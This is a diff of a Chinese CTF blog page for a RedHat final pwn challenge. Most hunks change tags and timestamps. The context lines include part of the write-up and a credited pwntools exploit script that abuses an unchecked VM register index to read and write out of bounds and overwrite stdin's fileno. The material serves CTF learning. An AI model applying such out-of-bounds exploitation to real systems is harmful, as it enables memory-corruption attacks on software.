@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <title>ReaHat_final_pwn | Whali3n51&#39;s blog</title>
-  <meta name="keywords" content=" WP复现 , Writeup ">
+  <meta name="keywords" content=" WP复现 ">
   <meta name="description" content="ReaHat_final_pwn | Whali3n51&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 not found页面未找到">
@@ -93,7 +93,15 @@
     
         
             
-            <li><div data-rel="pwn学习">pwn学习<small>(6)</small></div>
+            <li><div data-rel="pwn学习"><i class="fold iconfont icon-right"></i>pwn学习<small>(6)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Writeup">Writeup<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
                 
             </li>
             
@@ -117,7 +125,7 @@
     
         
             
-            <li><div data-rel="RE">RE<small>(2)</small></div>
+            <li><div data-rel="其他">其他<small>(2)</small></div>
                 
             </li>
             
@@ -125,9 +133,13 @@
     
         
             
-            <li><div data-rel="其他">其他<small>(2)</small></div>
+            <li><div data-rel="RE">RE<small>(2)</small></div>
                 
             </li>
+            
+        
+    
+        
             
         
     
@@ -199,19 +211,15 @@
         <a href="javascript:" target="_blank" rel="noopener" class="color5">re复现</a>
     </li>
     
-    <li class="article-tag-list-item">
-        <a href="javascript:" target="_blank" rel="noopener" class="color3">Writeup</a>
-    </li>
-    
     <div class="clearfix"></div>
 </div>
 
     
     <nav id="title-list-nav">
         
-        <a  class="pwn学习 "
+        <a  class="pwn学习 Writeup "
            href="/2019/11/28/RedHat/"
-           data-tag="WP复现,Writeup"
+           data-tag="WP复现"
            data-author="" >
             <span class="post-title" title="ReaHat_final_pwn">ReaHat_final_pwn</span>
             <span class="post-date" title="2019-11-28 23:30:00">2019/11/28</span>
@@ -375,7 +383,9 @@
         
         <span class="book">
             
-                <a href="javascript:" target="_blank" data-rel="pwn学习 noopener">pwn学习</a>
+                <a href="javascript:" target="_blank" data-rel="pwn学习 noopener">pwn学习</a>/
+            
+                <a href="javascript:" target="_blank" data-rel="Writeup noopener">Writeup</a>
             
         </span>
         
@@ -384,14 +394,12 @@
             
             <a href="javascript:" target="_blank" rel="noopener" class="color5">WP复现</a>
             
-            <a href="javascript:" target="_blank" rel="noopener" class="color3">Writeup</a>
-            
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-28 23:23:42'>2019-11-28 23:30</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-29 12:23:49'>2019-11-28 23:30</time>
         
     </div>
     <div class="article-meta">
@@ -455,6 +463,7 @@ PIE:      PIE enabled</code></pre><p>这一道题不能直接getshell，因为�
 
 <p>所以我们现在只需要将fileno该为0x233就可以了。</p>
 <p>这一题提供了加减乘除等等指令。这个题的漏洞就是在读取寄存器的时候，没有对索引值进行检查，导致了越界读写。因此将栈地址改为fileno的地址，通过入栈操作就可以将该题fileno修改了。不过计算起来贼麻烦，我没有自己算，哈哈哈哈哈哈哈 ，贴一下其他师傅的脚本吧。</p>
+<p>下面脚本是ditto师傅的，他的博客链接：<a href="http://dittozzz.top/" target="_blank" rel="noopener">http://dittozzz.top/</a> </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./RHVM.bin"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $reg = ($text_base+0x0000000000203060)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000001B15)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(op,idx1,idx2)</span>:</span></span><br><span class="line">    p = (op&lt;&lt;<span class="number">16</span>) | (idx1&lt;&lt;<span class="number">8</span>) | idx2 </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(len)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Give me code length: \n"</span>,str(len))</span><br><span class="line">    a.recvuntil(<span class="string">"Give me code: \n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(idx1,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,idx1,value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovDataToReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x42</span>,idx1,idx2)<span class="comment">#reg[reg[idx1]] = data[reg[idx2]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovRegToData</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x41</span>,idx1,idx2)<span class="comment">#data[reg[idx1]] = reg[idx2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xa0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftShift</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xe0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PushReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PopReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MulReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xc0</span>,idx1,idx2)</span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),<span class="comment"># reg[1] = 12</span></span><br><span class="line">    Read(<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = 0-8=-4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = -16</span></span><br><span class="line">    Read(<span class="number">3</span>,<span class="number">4</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>),<span class="comment"># reg[4] = data[-16]</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -15</span></span><br><span class="line">    AddReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 5</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>), <span class="comment"># get stderr addr</span></span><br><span class="line">    Read(<span class="number">6</span>,<span class="number">5</span>),<span class="comment">#reg[6] = 5</span></span><br><span class="line">    Read(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">2</span>),<span class="comment">#reg[7]= 9</span></span><br><span class="line">    LeftShift(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">5</span>),</span><br><span class="line">    LeftShift(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">6</span>),<span class="comment"># ==&gt; stdin.fileno</span></span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">3</span>),<span class="comment"># ==&gt; stdin.fileno-4</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment">#reg[0] = -15+8 = -7</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -8</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -9</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">5</span>),</span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -10</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">    MulReg(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">7</span>),</span><br><span class="line">    PushReg(<span class="number">1</span>)<span class="comment"># fileno ==&gt; 0x233</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">Init(len(payload))</span><br><span class="line">debug()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a.sendline(str(i))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -506,7 +515,7 @@ PIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了d
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" target="_blank" rel="noopener" title="Whali3n51">Whali3n51</a></p>
     <p><span class="copy-title">发布时间:</span>2019-11-28, 23:30:00</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-28, 23:23:42</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-29, 12:23:49</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/28/RedHat/" title="ReaHat_final_pwn">http://whali3n51.github.io/2019/11/28/RedHat/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -571,7 +580,7 @@ PIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了d
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#WP复现','#pwn','#re_wp','#re复现','#Writeup',],
+            'data': ['#WP复现','#pwn','#re_wp','#re复现',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
